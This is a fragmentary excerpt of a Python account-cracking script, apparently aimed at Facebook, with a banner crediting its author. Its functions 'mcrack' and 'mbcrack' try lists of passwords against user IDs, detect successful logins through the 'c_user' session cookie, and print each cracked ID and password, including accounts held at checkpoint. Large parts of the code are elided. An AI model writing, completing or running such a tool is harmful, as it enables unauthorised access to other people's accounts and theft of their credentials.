...
[+]═══════════════════════════════════════════
\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37m𝗠𝗥 𝗛𝗗 𝗝𝗢𝗞𝗘𝗥
\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37m𝗛𝗗 𝗞𝗢𝗞𝗢.𝗝𝗼𝗸𝗲𝗿
\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37m𝐌𝐑 𝗝𝗢𝗞𝗘𝗥 𝗞𝗵𝗔𝗻
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mMR.joker_00\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[joker_00-OK] '+cid+' | '+ps+'\033[1;32m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;91m[joker_00-CP] '+cid+' | '+ps+'\33[0;97m')
...
def mbcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mMR.joker_00\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
